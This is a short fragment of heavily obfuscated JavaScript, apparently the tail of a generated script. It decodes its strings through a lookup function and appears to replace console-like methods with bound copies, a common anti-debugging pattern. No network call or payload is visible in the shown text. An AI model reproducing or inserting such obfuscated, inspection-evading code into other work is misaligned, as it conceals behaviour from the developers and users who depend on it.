X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};